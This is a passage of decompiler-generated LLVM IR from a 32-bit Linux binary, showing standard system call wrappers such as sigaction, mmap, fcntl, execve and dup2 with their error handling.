  store i32 %v0_804f870, i32* %stack_var_-164, align 4
  %v0_804f871 = load i32, i32* @global_var_8058b0c.172, align 4
  store i32 %v0_804f871, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %v0_804f6d3)
  %v0_804f886 = load i32, i32* @eax, align 4
  %v1_804f889 = call i32 @function_804f274(i32 %v0_804f886)
  %v0_804f895 = load i32, i32* @ebx, align 4
  %v1_804f895 = inttoptr i32 %v0_804f895 to %sigcontext*
  %v2_804f895 = call i32 @sigreturn(%sigcontext* %v1_804f895)
  %v0_804f89d = load i32, i32* @ebx, align 4
  %v1_804f89d = inttoptr i32 %v0_804f89d to %sigcontext*
  %v2_804f89d = call i32 @sigreturn(%sigcontext* %v1_804f89d)
  ret i32 %v2_804f89d

; uselistorder directives
  uselistorder i32 %v1_804f843, { 1, 2, 0 }
  uselistorder i32 %v1_804f81f, { 1, 2, 0 }
  uselistorder i32 %v2_804f75d, { 1, 0 }
  uselistorder i32 %v1_804f75a, { 2, 1, 0 }
  uselistorder i32 %v1_804f739, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804f736, { 1, 0 }
  uselistorder i32 %v1_804f70d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-164, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @function_804f274, { 0, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80560a8.174 to i32), i32 -134570152), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_80560a8.174 to i32), i32 -134570152), i32 2), { 2, 0, 3, 4, 1 }
  uselistorder i32 ()* @function_804f65f, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 14, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_804f83c, { 1, 0 }
  uselistorder label %dec_label_pc_804f818, { 1, 0 }
  uselistorder label %dec_label_pc_804f7f3, { 1, 0 }
  uselistorder label %dec_label_pc_804f75a, { 1, 0 }
  uselistorder label %dec_label_pc_804f742, { 1, 0 }
}

define i32 @function_804f89f(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f89f:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_804f89f = load i32, i32* @esi, align 4
  %v0_804f8a0 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_804f8b5 = icmp eq i32* %arg2, null
  br i1 %v1_804f8b5, label %dec_label_pc_804f909, label %dec_label_pc_804f8b9

dec_label_pc_804f8b9:                             ; preds = %dec_label_pc_804f89f
  %v2_804f8b9 = load i32, i32* %arg2, align 4
  store i32 %v2_804f8b9, i32* %stack_var_-148, align 4
  %v1_804f8c2 = add i32 %tmp11, 4
  %v3_804f8d4 = bitcast i32* %stack_var_-136 to i16*
  %v4_804f8d4 = call i32 @function_804d4b8(i16* %v3_804f8d4, i32 %v1_804f8c2, i32 128)
  br label %dec_label_pc_804f909

dec_label_pc_804f909:                             ; preds = %dec_label_pc_804f89f, %dec_label_pc_804f8b9
  %v1_804f90b = icmp eq i32 %arg3, 0
  br i1 %v1_804f90b, label %dec_label_pc_804f913, label %dec_label_pc_804f90f

dec_label_pc_804f90f:                             ; preds = %dec_label_pc_804f909
  %v2_804f90f = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_804f913

dec_label_pc_804f913:                             ; preds = %dec_label_pc_804f909, %dec_label_pc_804f90f
  %v0_804f922 = phi i32 [ 0, %dec_label_pc_804f909 ], [ %v2_804f90f, %dec_label_pc_804f90f ]
  br i1 %v1_804f8b5, label %dec_label_pc_804f920, label %dec_label_pc_804f919

dec_label_pc_804f919:                             ; preds = %dec_label_pc_804f913
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_804f920

dec_label_pc_804f920:                             ; preds = %dec_label_pc_804f913, %dec_label_pc_804f919
  %v0_804f923 = phi %sigaction* [ null, %dec_label_pc_804f913 ], [ %phitmp, %dec_label_pc_804f919 ]
  %v5_804f92b = call i32 @function_804fa7c(i32 %arg1, %sigaction* %v0_804f923, i32 %v0_804f922, i32 8)
  store i32 %v5_804f92b, i32* %ebx.global-to-local, align 4
  br i1 %v1_804f90b, label %dec_label_pc_804f96e, label %dec_label_pc_804f939

dec_label_pc_804f939:                             ; preds = %dec_label_pc_804f920
  %v2_804f939 = icmp slt i32 %v5_804f92b, 0
  br i1 %v2_804f939, label %dec_label_pc_804f96e, label %dec_label_pc_804f93d

dec_label_pc_804f93d:                             ; preds = %dec_label_pc_804f939
  %v3_804f93d = load i32, i32* %stack_var_-288, align 4
  %v2_804f941 = inttoptr i32 %arg3 to i32*
  store i32 %v3_804f93d, i32* %v2_804f941, align 4
  %v2_804f949 = ptrtoint i32* %stack_var_-276 to i32
  %v1_804f94e = add i32 %arg3, 4
  %v3_804f952 = inttoptr i32 %v1_804f94e to i16*
  %v4_804f952 = call i32 @function_804d4b8(i16* %v3_804f952, i32 %v2_804f949, i32 128)
  %v2_804f95b = add i32 %arg3, 132
  %v3_804f95b = inttoptr i32 %v2_804f95b to i32*
  %v2_804f968 = add i32 %arg3, 136
  %v3_804f968 = inttoptr i32 %v2_804f968 to i32*
  %v0_804f974.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f96e

dec_label_pc_804f96e:                             ; preds = %dec_label_pc_804f939, %dec_label_pc_804f920, %dec_label_pc_804f93d
  %v0_804f974 = phi i32 [ %v5_804f92b, %dec_label_pc_804f939 ], [ %v5_804f92b, %dec_label_pc_804f920 ], [ %v0_804f974.pre, %dec_label_pc_804f93d ]
  store i32 %v0_804f8a0, i32* @ebx, align 4
  store i32 %v0_804f89f, i32* @esi, align 4
  ret i32 %v0_804f974

; uselistorder directives
  uselistorder i32 %v5_804f92b, { 0, 1, 3, 2 }
  uselistorder i1 %v1_804f90b, { 1, 0 }
  uselistorder i1 %v1_804f8b5, { 1, 0 }
  uselistorder i32* null, { 1, 3, 2, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 2, 0, 4, 3, 1, 5 }
  uselistorder label %dec_label_pc_804f96e, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804f920, { 1, 0 }
  uselistorder label %dec_label_pc_804f913, { 1, 0 }
  uselistorder label %dec_label_pc_804f909, { 1, 0 }
}

define i32 @function_804f97c() local_unnamed_addr {
dec_label_pc_804f97c:
  %v0_804f982 = call i32 @vfork()
  %v5_804f985 = icmp ult i32 %v0_804f982, -4095
  %v1_804f98a = icmp eq i1 %v5_804f985, false
  call void @__pseudo_cond_branch(i1 %v1_804f98a, i32 134551236)
  ret i32 %v0_804f982
}

define i32 @function_804f994(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_804f994:
  %stack_var_4 = alloca i32, align 4
  %v0_804f994 = load i32, i32* @ebx, align 4
  store i32 %v0_804f994, i32* @edx, align 4
  %v2_804f99f = load i32, i32* @ecx, align 4
  %v4_804f99f = load i32, i32* @esi, align 4
  %v5_804f99f = load i32, i32* @edi, align 4
  %v6_804f99f = load i32, i32* @ebp, align 4
  %v7_804f99f = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_804f99f, i32 %v0_804f994, i32 %v4_804f99f, i32 %v5_804f99f, i32 %v6_804f99f)
  %v8_804f99f = ptrtoint i32* %v7_804f99f to i32
  store i32 %v0_804f994, i32* @ebx, align 4
  %tmp = icmp ugt i32* %v7_804f99f, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %tmp, i32 134551236)
  ret i32 %v8_804f99f

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 1, 0 }
  uselistorder i32 134551236, { 1, 0 }
}

define i32 @function_804f9b0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804f9b0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804f9b0 = load i32, i32* @ebx, align 4
  store i32 %v0_804f9b0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804f9c3 = call i32 @int80_syscall(i32 102)
  store i32 %v1_804f9c3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804f9c3, -4095
  br i1 %tmp, label %dec_label_pc_804f9dc, label %dec_label_pc_804f9d0

dec_label_pc_804f9d0:                             ; preds = %dec_label_pc_804f9b0
  %v0_804f9d0 = load i32, i32* %stack_var_-4, align 4
  %v1_804f9d0 = call i32 @function_804baa4(i32 %v0_804f9d0)
  %v0_804f9d5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804f9d5 = sub i32 0, %v0_804f9d5
  %v2_804f9d7 = inttoptr i32 %v1_804f9d0 to i32*
  store i32 %v1_804f9d5, i32* %v2_804f9d7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804f9dc

dec_label_pc_804f9dc:                             ; preds = %dec_label_pc_804f9b0, %dec_label_pc_804f9d0
  %v0_804f9dd = phi i32 [ %v1_804f9c3, %dec_label_pc_804f9b0 ], [ -1, %dec_label_pc_804f9d0 ]
  %v2_804f9dc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f9dc, i32* @edx, align 4
  %v2_804f9e0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804f9e0, i32* @ebx, align 4
  ret i32 %v0_804f9dd

; uselistorder directives
  uselistorder i32 %v1_804f9c3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f9dc, { 1, 0 }
}

define i32 @function_804f9e4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804f9e4:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804f9e4 = load i32, i32* @edi, align 4
  %v0_804f9e5 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_804f9fd = add i32 %arg2, -12
  %v6_804fa03 = icmp ugt i32 %v1_804f9fd, 2
  br i1 %v6_804fa03, label %dec_label_pc_804fa13, label %dec_label_pc_804fa05

dec_label_pc_804fa05:                             ; preds = %dec_label_pc_804f9e4
  %v4_804fa09 = call i32 @function_804fa3c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804f9fd)
  br label %dec_label_pc_804fa35

dec_label_pc_804fa13:                             ; preds = %dec_label_pc_804f9e4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804fa1b = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804fa1b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804fa1b, -4095
  br i1 %tmp, label %dec_label_pc_804fa33, label %dec_label_pc_804fa27

dec_label_pc_804fa27:                             ; preds = %dec_label_pc_804fa13
  %v1_804fa27 = call i32 @function_804baa4(i32 %v0_804f9e5)
  %v0_804fa2c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fa2c = sub i32 0, %v0_804fa2c
  %v2_804fa2e = inttoptr i32 %v1_804fa27 to i32*
  store i32 %v1_804fa2c, i32* %v2_804fa2e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fa33

dec_label_pc_804fa33:                             ; preds = %dec_label_pc_804fa13, %dec_label_pc_804fa27
  %v0_804fa33 = phi i32 [ %v2_804fa1b, %dec_label_pc_804fa13 ], [ -1, %dec_label_pc_804fa27 ]
  br label %dec_label_pc_804fa35

dec_label_pc_804fa35:                             ; preds = %dec_label_pc_804fa05, %dec_label_pc_804fa33
  %v0_804fa3a = phi i32 [ %v4_804fa09, %dec_label_pc_804fa05 ], [ %v0_804fa33, %dec_label_pc_804fa33 ]
  store i32 %v0_804f9e5, i32* @ebx, align 4
  store i32 %v0_804f9e4, i32* @edi, align 4
  ret i32 %v0_804fa3a

; uselistorder directives
  uselistorder i32 %v2_804fa1b, { 1, 0, 2 }
  uselistorder i32 %v0_804f9e5, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804fa35, { 1, 0 }
  uselistorder label %dec_label_pc_804fa33, { 1, 0 }
}

define i32 @function_804fa3c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fa3c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fa3c = load i32, i32* @edi, align 4
  store i32 %v0_804fa3c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804fa54 = load i32, i32* @ebx, align 4
  %v1_804fa5c = call i32 @int80_syscall(i32 221)
  store i32 %v1_804fa5c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fa5c, -4095
  br i1 %tmp, label %dec_label_pc_804fa74, label %dec_label_pc_804fa68

dec_label_pc_804fa68:                             ; preds = %dec_label_pc_804fa3c
  %v1_804fa68 = call i32 @function_804baa4(i32 %v0_804fa54)
  %v0_804fa6d = load i32, i32* %edi.global-to-local, align 4
  %v1_804fa6d = sub i32 0, %v0_804fa6d
  %v2_804fa6f = inttoptr i32 %v1_804fa68 to i32*
  store i32 %v1_804fa6d, i32* %v2_804fa6f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fa74

dec_label_pc_804fa74:                             ; preds = %dec_label_pc_804fa3c, %dec_label_pc_804fa68
  %v0_804fa77 = phi i32 [ %v1_804fa5c, %dec_label_pc_804fa3c ], [ -1, %dec_label_pc_804fa68 ]
  %v2_804fa79 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fa79, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fa77

; uselistorder directives
  uselistorder i32 %v1_804fa5c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fa74, { 1, 0 }
}

define i32 @function_804fa7c(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fa7c:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_804fa7d = load i32, i32* @esi, align 4
  store i32 %v0_804fa7d, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804fa91 = load i32, i32* @ebx, align 4
  %v7_804fa99 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_804fa99, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v7_804fa99, -4095
  br i1 %tmp, label %dec_label_pc_804fab1, label %dec_label_pc_804faa5

dec_label_pc_804faa5:                             ; preds = %dec_label_pc_804fa7c
  %v1_804faa5 = call i32 @function_804baa4(i32 %v0_804fa91)
  %v0_804faaa = load i32, i32* %esi.global-to-local, align 4
  %v1_804faaa = sub i32 0, %v0_804faaa
  %v2_804faac = inttoptr i32 %v1_804faa5 to i32*
  store i32 %v1_804faaa, i32* %v2_804faac, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fab1

dec_label_pc_804fab1:                             ; preds = %dec_label_pc_804fa7c, %dec_label_pc_804faa5
  %v0_804fab2 = phi i32 [ %v7_804fa99, %dec_label_pc_804fa7c ], [ -1, %dec_label_pc_804faa5 ]
  %v2_804fab4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804fab4, i32* @esi, align 4
  ret i32 %v0_804fab2

; uselistorder directives
  uselistorder i32 %v7_804fa99, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fab1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @function_804fab8(i32 %arg1) local_unnamed_addr #0 {
dec_label_pc_804fab8:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @function_804fae0(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fae0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fae0 = load i32, i32* @ebx, align 4
  store i32 %v0_804fae0, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_804faf3 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_804faf3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804faf3, -4095
  br i1 %tmp, label %dec_label_pc_804fb0c, label %dec_label_pc_804fb00

dec_label_pc_804fb00:                             ; preds = %dec_label_pc_804fae0
  %v0_804fb00 = load i32, i32* %stack_var_-4, align 4
  %v1_804fb00 = call i32 @function_804baa4(i32 %v0_804fb00)
  %v0_804fb05 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fb05 = sub i32 0, %v0_804fb05
  %v2_804fb07 = inttoptr i32 %v1_804fb00 to i32*
  store i32 %v1_804fb05, i32* %v2_804fb07, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb0c

dec_label_pc_804fb0c:                             ; preds = %dec_label_pc_804fae0, %dec_label_pc_804fb00
  %v0_804fb0d = phi i32 [ %v4_804faf3, %dec_label_pc_804fae0 ], [ -1, %dec_label_pc_804fb00 ]
  %v2_804fb0c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fb0c, i32* @edx, align 4
  %v2_804fb10 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fb10, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804fb0d

; uselistorder directives
  uselistorder i32 %v4_804faf3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fb0c, { 1, 0 }
}

define i32 @function_804fb14(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fb14:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb14 = load i32, i32* @ebx, align 4
  store i32 %v0_804fb14, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804fb27 = call i32 @dup2(i32 %arg1, i32 %arg2)
  store i32 %v2_804fb27, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804fb27, -4095
  br i1 %tmp, label %dec_label_pc_804fb40, label %dec_label_pc_804fb34

dec_label_pc_804fb34:                             ; preds = %dec_label_pc_804fb14
  %v0_804fb34 = load i32, i32* %stack_var_-4, align 4
  %v1_804fb34 = call i32 @function_804baa4(i32 %v0_804fb34)
  %v0_804fb39 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fb39 = sub i32 0, %v0_804fb39
  %v2_804fb3b = inttoptr i32 %v1_804fb34 to i32*
  store i32 %v1_804fb39, i32* %v2_804fb3b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fb40

dec_label_pc_804fb40:                             ; preds = %dec_label_pc_804fb14, %dec_label_pc_804fb34
  %v0_804fb41 = phi i32 [ %v2_804fb27, %dec_label_pc_804fb14 ], [ -1, %dec_label_pc_804fb34 ]
  %v2_804fb44 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fb44, i32* @ebx, align 4
  ret i32 %v0_804fb41

; uselistorder directives
  uselistorder i32 %v2_804fb27, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fb40, { 1, 0 }
}

define i32 @function_804fb48(i8* %arg1) local_unnamed_addr {
dec_label_pc_804fb48:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_1()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v0_804fb48 = load i32, i32* @edi, align 4
  store i32 %v0_804fb48, i32* %stack_var_-4, align 4
  %v4_804fb4c = ptrtoint i8* %arg1 to i32
  store i32 %v4_804fb4c, i32* %edi.global-to-local, align 4
  %v0_804fb58 = load i32, i32* @ebx, align 4
  %v5_804fb60 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_804fb60 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_804fb60 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_804fb60, [1 x i8*] %v8_804fb60)
  store i32 %v9_804fb60, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_804fb60, -4095
  br i1 %tmp12, label %dec_label_pc_804fb78, label %dec_label_pc_804fb6c

dec_label_pc_804fb6c:                             ; preds = %dec_label_pc_804fb48
  %v1_804fb6c = call i32 @function_804baa4(i32 %v0_804fb58)
  %v0_804fb71 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fb71 = sub i32 0, %v0_804fb71
  %v2_804fb73 = inttoptr i32 %v1_804fb6c to i32*
  store i32 %v1_804fb71, i32* %v2_804fb73, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fb78

dec_label_pc_804fb78:                             ; preds = %dec_label_pc_804fb48, %dec_label_pc_804fb6c
  %v0_804fb79 = phi i32 [ %v9_804fb60, %dec_label_pc_804fb48 ], [ -1, %dec_label_pc_804fb6c ]
  %v2_804fb7c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fb7c, i32* %edi.global-to-local, align 4
  ret i32 %v0_804fb79

; uselistorder directives
  uselistorder i32 %v9_804fb60, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fb78, { 1, 0 }
}

define i32 @function_804fb80() local_unnamed_addr {
dec_label_pc_804fb80:
  %stack_var_-8 = alloca i32, align 4
  %v2_804fb83 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804fb8a = call i32 @function_804fc20(i32 7, i32 %v2_804fb83)
  store i32 256, i32* @edx, align 4
  %v2_804fb97 = icmp slt i32 %v2_804fb8a, 0
  br i1 %v2_804fb97, label %dec_label_pc_804fb9f, label %dec_label_pc_804fb9b

dec_label_pc_804fb9b:                             ; preds = %dec_label_pc_804fb80
  %v3_804fb9b = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804fb9b, i32* @edx, align 4
  br label %dec_label_pc_804fb9f

dec_label_pc_804fb9f:                             ; preds = %dec_label_pc_804fb80, %dec_label_pc_804fb9b
  %v0_804fb9f = phi i32 [ 256, %dec_label_pc_804fb80 ], [ %v3_804fb9b, %dec_label_pc_804fb9b ]
  ret i32 %v0_804fb9f

; uselistorder directives
  uselistorder label %dec_label_pc_804fb9f, { 1, 0 }
}

define i32 @function_804fba8() local_unnamed_addr {
dec_label_pc_804fba8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fba8 = load i32, i32* @ebx, align 4
  store i32 %v0_804fba8, i32* %stack_var_-4, align 4
  %v1_804fbb1 = call i32 @int80_syscall(i32 202)
  store i32 %v1_804fbb1, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fbb1, -4095
  br i1 %tmp, label %dec_label_pc_804fbc8, label %dec_label_pc_804fbbc

dec_label_pc_804fbbc:                             ; preds = %dec_label_pc_804fba8
  %v0_804fbbc = load i32, i32* %stack_var_-4, align 4
  %v1_804fbbc = call i32 @function_804baa4(i32 %v0_804fbbc)
  %v0_804fbc1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fbc1 = sub i32 0, %v0_804fbc1
  %v2_804fbc3 = inttoptr i32 %v1_804fbbc to i32*
  store i32 %v1_804fbc1, i32* %v2_804fbc3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fbc8

dec_label_pc_804fbc8:                             ; preds = %dec_label_pc_804fba8, %dec_label_pc_804fbbc
  %v0_804fbc9 = phi i32 [ %v1_804fbb1, %dec_label_pc_804fba8 ], [ -1, %dec_label_pc_804fbbc ]
  %v2_804fbcc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fbcc, i32* @ebx, align 4
  ret i32 %v0_804fbc9

; uselistorder directives
  uselistorder i32 %v1_804fbb1, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fbc8, { 1, 0 }
}

define i32 @function_804fbd0() local_unnamed_addr {
dec_label_pc_804fbd0:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fbd0 = load i32, i32* @ebx, align 4
  store i32 %v0_804fbd0, i32* %stack_var_-4, align 4
  %v1_804fbd9 = call i32 @int80_syscall(i32 201)
  store i32 %v1_804fbd9, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fbd9, -4095
  br i1 %tmp, label %dec_label_pc_804fbf0, label %dec_label_pc_804fbe4

dec_label_pc_804fbe4:                             ; preds = %dec_label_pc_804fbd0
  %v0_804fbe4 = load i32, i32* %stack_var_-4, align 4
  %v1_804fbe4 = call i32 @function_804baa4(i32 %v0_804fbe4)
  %v0_804fbe9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fbe9 = sub i32 0, %v0_804fbe9
  %v2_804fbeb = inttoptr i32 %v1_804fbe4 to i32*
  store i32 %v1_804fbe9, i32* %v2_804fbeb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fbf0

dec_label_pc_804fbf0:                             ; preds = %dec_label_pc_804fbd0, %dec_label_pc_804fbe4
  %v0_804fbf1 = phi i32 [ %v1_804fbd9, %dec_label_pc_804fbd0 ], [ -1, %dec_label_pc_804fbe4 ]
  %v2_804fbf4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fbf4, i32* @ebx, align 4
  ret i32 %v0_804fbf1

; uselistorder directives
  uselistorder i32 %v1_804fbd9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fbf0, { 1, 0 }
}

define i32 @function_804fbf8() local_unnamed_addr {
dec_label_pc_804fbf8:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fbf8 = load i32, i32* @ebx, align 4
  store i32 %v0_804fbf8, i32* %stack_var_-4, align 4
  %v1_804fc01 = call i32 @int80_syscall(i32 200)
  store i32 %v1_804fc01, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fc01, -4095
  br i1 %tmp, label %dec_label_pc_804fc18, label %dec_label_pc_804fc0c

dec_label_pc_804fc0c:                             ; preds = %dec_label_pc_804fbf8
  %v0_804fc0c = load i32, i32* %stack_var_-4, align 4
  %v1_804fc0c = call i32 @function_804baa4(i32 %v0_804fc0c)
  %v0_804fc11 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804fc11 = sub i32 0, %v0_804fc11
  %v2_804fc13 = inttoptr i32 %v1_804fc0c to i32*
  store i32 %v1_804fc11, i32* %v2_804fc13, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804fc18

dec_label_pc_804fc18:                             ; preds = %dec_label_pc_804fbf8, %dec_label_pc_804fc0c
  %v0_804fc19 = phi i32 [ %v1_804fc01, %dec_label_pc_804fbf8 ], [ -1, %dec_label_pc_804fc0c ]
  %v2_804fc1c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fc1c, i32* %ebx.global-to-local, align 4
  ret i32 %v0_804fc19

; uselistorder directives
  uselistorder i32 %v1_804fc01, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804fc18, { 1, 0 }
}

define i32 @function_804fc20(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804fc20:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804fc20 = load i32, i32* @ebx, align 4
  store i32 %v0_804fc20, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804fc33 = call i32 @int80_syscall(i32 191)
  store i32 %v1_804fc33, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804fc33, -4095
  br i1 %tmp, label %dec_label_pc_804fc4c, label %dec_label_pc_804fc40

dec_label_pc_804fc40:                             ; preds = %dec_label_pc_804fc20
  %v0_804fc40 = load i32, i32* %stack_var_-4, align 4
  %v1_804fc40 = call i32 @function_804baa4(i32 %v0_804fc40)
  %v0_804fc45 = load i32, i32* %ebx.global-to-local, align 4
